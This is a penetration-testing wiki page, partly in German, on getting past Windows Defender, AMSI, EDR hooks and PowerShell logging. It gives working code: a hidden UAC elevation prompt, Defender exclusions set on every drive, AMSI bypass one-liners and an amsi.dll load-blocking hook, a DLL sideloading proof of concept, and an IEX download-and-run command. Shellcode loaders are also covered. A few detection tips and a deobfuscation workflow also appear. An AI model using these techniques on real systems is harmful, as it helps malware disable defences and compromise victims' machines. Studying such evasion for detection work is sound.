# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich geschrieben von** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender außer Funktion zu setzen.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, das Windows Defender außer Funktion setzt, indem es sich als ein anderes AV ausgibt.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-ähnlicher UAC-Köder, bevor Defender manipuliert wird

Public loaders masquerading as game cheats frequently ship as unsigned Node.js/Nexe installers that first **bitten zuerst den Benutzer um Elevation** and only then neuter Defender. The flow is simple:

1. Mit `net session` auf administrativen Kontext prüfen. Der Befehl gelingt nur, wenn der Aufrufer Admin-Rechte hat; ein Fehlschlag bedeutet, dass der Loader als Standardbenutzer ausgeführt wird.
2. Sich sofort mit dem `RunAs`-Verb neu starten, um die erwartete UAC-Zustimmungsabfrage auszulösen und dabei die ursprüngliche Kommandozeile beizubehalten.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Opfer glauben bereits, dass sie “cracked” Software installieren, daher wird die Aufforderung in der Regel akzeptiert, wodurch die Malware die Rechte erhält, die sie benötigt, um die Defender-Richtlinie zu ändern.

### Pauschale `MpPreference`-Ausschlüsse für jeden Laufwerksbuchstaben

Sobald erhöhte Rechte erlangt wurden, maximieren GachiLoader-style chains die Blindstellen von Defender, anstatt den Dienst vollständig zu deaktivieren. Der Loader beendet zuerst den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und setzt dann **extrem weitreichende Ausschlüsse**, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jedes Wechselmedium nicht mehr gescannt werden kann:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **any future payload dropped anywhere on disk is ignored**.
- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.

Because no Defender service is stopped, naïve health checks keep reporting “antivirus active” even though real-time inspection never touches those paths.

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

- **Encryption**

If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.

- **Obfuscation**

Sometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.

- **Custom tooling**

If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

It turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev Kanal</p></figcaption></figure>

As we've said before in this post, **public tools** will eventually **get detected**, so, you should ask yourself something:

For example, if you want to dump LSASS, **do you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.

The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in Defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme innerhalb von "C:\Program Files\\" aus, die für DLL hijacking anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, dass Sie **erkunden Sie DLL Hijackable/Sideloadable programs selbst**, diese Technik ist ziemlich stealthy, wenn sie richtig angewendet wird, aber wenn Sie öffentlich bekannte DLL Sideloadable programs verwenden, können Sie leicht erwischt werden.

Allein das Platzieren einer bösartigen DLL mit dem Namen, den ein Programm zu laden erwartet, lädt nicht automatisch Ihren payload, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm an die Proxy-(und bösartige) DLL macht, an die Original-DLL weiter, wodurch die Funktionalität des Programms erhalten bleibt und die Ausführung Ihres payload ermöglicht wird.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Das sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl wird uns 2 Dateien liefern: eine DLL-Quellcodevorlage und die original umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser shellcode (kodiert mit [SGN](https://github.com/EgeBalci/sgn)) als auch die proxy DLL haben eine Erkennungsrate von 0/26 bei [antiscan.me](https://antiscan.me)! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dass du [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading und auch [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ansiehst, um mehr über das, was wir ausführlicher besprochen haben, zu erfahren.

### Missbrauch weitergeleiteter Exporte (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Wichtige Verhaltensweisen:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

Dies ermöglicht eine indirekte sideloading-Primitive: finde eine signierte DLL, die eine Funktion exportiert, die auf einen nicht-KnownDLL-Modulnamen weitergeleitet wird, und platziere diese signierte DLL zusammen mit einer vom Angreifer kontrollierten DLL, die genau den Namen des weitergeleiteten Zielmoduls trägt. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis und führt deine DllMain aus.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist kein KnownDLL, daher wird es über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im selben Ordner ab. Eine minimale DllMain reicht aus, um Codeausführung zu erreichen; du musst die weitergeleitete Funktion nicht implementieren, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Lösen Sie den forward mit einem signierten LOLBin aus:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signed) lädt die side-by-side `keyiso.dll` (signed)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader der Weiterleitung zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt dann `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhältst du erst nach Ausführung von `DllMain` einen "missing API"-Fehler

Hunting tips:
- Konzentriere dich auf weitergeleitete Exporte, bei denen das Zielmodul kein KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgelistet.
- Du kannst weitergeleitete Exporte mit Tooling wie z. B. aufzählen:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11 Forwarder-Inventar, um Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt

Erkennungs-/Abwehrideen:
- Überwache LOLBins (z. B. rundll32.exe), die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden von non-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Alarm bei Prozess-/Modulketten wie: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` unter vom Benutzer beschreibbaren Pfaden
- Durchsetzen von Code-Integritätsrichtlinien (WDAC/AppLocker) und Verweigern von write+execute in Anwendungsverzeichnissen

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ist ein payload toolkit zur Umgehung von EDRs durch suspended processes, direct syscalls und alternative execution methods`

Sie können Freeze verwenden, um Ihren Shellcode auf unauffällige Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist ein Katz-und-Maus-Spiel; was heute funktioniert, kann morgen entdeckt werden, verlasse dich also niemals nur auf ein Tool — versuche, wenn möglich, mehrere Evasion-Techniken zu verketten.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs platzieren oft **user-mode inline hooks** auf `ntdll.dll` syscall stubs. Um diese Hooks zu umgehen, kannst du **direct** oder **indirect** syscall stubs erzeugen, die die korrekte **SSN** (System Service Number) laden und in den Kernel-Modus wechseln, ohne den gehookten Export-Einstiegspunkt auszuführen.

**Invocation options:**
- **Direct (embedded)**: emit a `syscall`/`sysenter`/`SVC #0` instruction in the generated stub (no `ntdll` export hit).
- **Indirect**: jump into an existing `syscall` gadget inside `ntdll` so the kernel transition appears to originate from `ntdll` (useful for heuristic evasion); **randomized indirect** picks a gadget from a pool per call.
- **Egg-hunt**: avoid embedding the static `0F 05` opcode sequence on disk; resolve a syscall sequence at runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: infer SSNs by sorting syscall stubs by virtual address instead of reading stub bytes.
- **SyscallsFromDisk**: map a clean `\KnownDlls\ntdll.dll`, read SSNs from its `.text`, then unmap (bypasses all in-memory hooks).
- **RecycledGate**: combine VA-sorted SSN inference with opcode validation when a stub is clean; fall back to VA inference if hooked.
- **HW Breakpoint**: set DR0 on the `syscall` instruction and use a VEH to capture the SSN from `EAX` at runtime, without parsing hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI wurde erstellt, um "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" zu verhindern. Ursprünglich konnten AVs nur **Dateien auf der Festplatte** scannen, sodass, wenn man Payloads **direkt in-memory** ausführen konnte, das AV nichts dagegen tun konnte, da es nicht genug Sichtbarkeit hatte.

Die AMSI-Funktion ist in folgende Komponenten von Windows integriert.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Sie erlaubt Antivirus-Lösungen, das Verhalten von Skripten zu inspizieren, indem Skriptinhalte in einer Form offengelegt werden, die weder verschlüsselt noch obfuskiert ist.

Das Ausführen von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` erzeugt die folgende Warnung in Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie es `amsi:` voranstellt und dann den Pfad zur ausführbaren Datei angibt, von der das Skript ausgeführt wurde — in diesem Fall powershell.exe.

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem in-memory von AMSI entdeckt.

Außerdem werden, beginnend mit **.NET 4.8**, auch C#-Code durch AMSI geleitet. Das betrifft sogar `Assembly.Load(byte[])` für in-memory Ausführung. Deshalb wird empfohlen, für in-memory Ausführung niedrigere Versionen von .NET (wie 4.7.2 oder niedriger) zu verwenden, wenn man AMSI umgehen möchte.

Es gibt ein paar Möglichkeiten, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der Skripte, die man zu laden versucht, eine gute Methode zur Umgehung der Erkennung sein.

Allerdings hat AMSI die Fähigkeit, Skripte zu deobfuskieren, sogar wenn sie mehrere Schichten haben, sodass Obfuskation je nach Umsetzung eine schlechte Option sein kann. Das macht das Umgehen nicht ganz trivial. Manchmal reicht es aber, ein paar Variablennamen zu ändern, und man ist durch — es kommt also darauf an, wie stark etwas markiert wurde.

- **AMSI Bypass**

Da AMSI implementiert ist, indem eine DLL in den powershell-Prozess (ebenfalls cscript.exe, wscript.exe, etc.) geladen wird, ist es möglich, diese leicht zu manipulieren, selbst wenn man als nicht privilegierter Benutzer läuft. Aufgrund dieses Implementierungsfehlers von AMSI haben Forscher mehrere Wege gefunden, das AMSI-Scanning zu umgehen.

**Forcing an Error**

Das Erzwingen eines Fehlschlags der AMSI-Initialisierung (amsiInitFailed) führt dazu, dass für den aktuellen Prozess kein Scan gestartet wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) veröffentlicht, und Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Alles, was es brauchte, war eine einzige Zeile powershell-Code, um AMSI für den aktuellen powershell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst gekennzeichnet, daher sind einige Änderungen nötig, um diese Technik nutzen zu können.

Hier ist ein modifizierter AMSI bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich auffallen wird, sobald dieser Beitrag veröffentlicht wird. Wenn dein Plan ist, unentdeckt zu bleiben, solltest du daher keinen Code veröffentlichen.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt und beinhaltet das Finden der Adresse der Funktion "AmsiScanBuffer" in amsi.dll (verantwortlich für das Scannen der vom Benutzer bereitgestellten Eingabe) und das Überschreiben dieser Funktion mit Instruktionen, die den Code E_INVALIDARG zurückgeben. Auf diese Weise liefert das eigentliche Scan-Ergebnis 0, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Bitte lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

Es gibt auch viele andere Techniken, um AMSI mit powershell zu umgehen — siehe [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), um mehr darüber zu erfahren.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User‑Mode‑Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI nie geladen und es finden für diesen Prozess keine Scans statt.

Implementierungsübersicht (x64 C/C++ Pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Hinweise
- Funktioniert sowohl mit PowerShell, WScript/CScript als auch mit eigenen Loadern (alles, was sonst AMSI laden würde).
- Kombiniere es mit dem Einspeisen von Skripten über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Kommandozeilen-Artefakte zu vermeiden.
- Wurde bei Loadern beobachtet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Das Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** erzeugt ebenfalls Skripte, um AMSI zu umgehen.
Das Tool **[https://amsibypass.com/](https://amsibypass.com/)** erzeugt ebenfalls Skripte, um AMSI zu umgehen; diese vermeiden Signaturerkennung durch randomisierte benutzerdefinierte Funktionen, Variablen und Zeichen-Ausdrücke und wenden zufällige Groß-/Kleinschreibung auf PowerShell-Schlüsselwörter an, um Signaturen zu umgehen.

**Entferne die erkannte Signatur**

Du kannst ein Tool wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool arbeitet, indem es den Speicher des aktuellen Prozesses nach der AMSI-Signatur durchsucht und diese dann mit NOP-Instruktionen überschreibt, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste von AV/EDR-Produkten, die AMSI verwenden, findest du in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell Version 2 verwenden**
Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne von AMSI gescannt zu werden. Du kannst dies so tun:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is a feature that allows you to log all PowerShell commands executed on a system. This can be useful for auditing and troubleshooting purposes, but it can also be a **problem for attackers who want to evade detection**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Sie können ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) dafür verwenden.
- **Use Powershell version 2**: Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ausführen können, ohne von AMSI gescannt zu werden. Sie können dies so tun: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Verwenden Sie [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um eine PowerShell-Session ohne Abwehrmechanismen zu starten (das ist das, was `powerpick` von Cobal Strike verwendet).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/) Kompilierungs-Suite bereitzustellen, der erhöhte Software-Sicherheit durch code obfuscation und tamper-proofing bietet.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie man die `C++11/14`-Sprache verwendet, um zur Compile-Zeit obfuscated code zu erzeugen, ohne externe Tools zu verwenden und ohne den Compiler zu verändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht von obfuscated operations hinzu, die durch das C++ Template-Metaprogramming-Framework generiert werden und das Leben der Person, die versucht, die Anwendung zu cracken, etwas schwieriger machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64 binary obfuscator, der verschiedene PE-Dateien obfuscate kann, darunter: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphic code engine für beliebige Executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein feinkörniges code obfuscation framework für LLVM-unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuscates ein Programm auf Assembly-Ebene, indem es normale Instruktionen in ROP chains transformiert und so unsere natürliche Vorstellung von normalem Kontrollfluss vereitelt.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter, geschrieben in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL in shellcode konvertieren und diese dann laden

## SmartScreen & MoTW

Sie haben diesen Bildschirm vielleicht gesehen, wenn Sie ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt haben.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der den Endbenutzer davor schützen soll, potenziell bösartige Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funktioniert hauptsächlich reputationsbasiert, was bedeutet, dass selten heruntergeladene Anwendungen SmartScreen auslösen, wodurch der Endbenutzer gewarnt wird und daran gehindert wird, die Datei auszuführen (obwohl die Datei immer noch ausgeführt werden kann, indem man auf More Info -> Run anyway klickt).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der automatisch beim Herunterladen von Dateien aus dem Internet erstellt wird, zusammen mit der URL, von der sie heruntergeladen wurden.

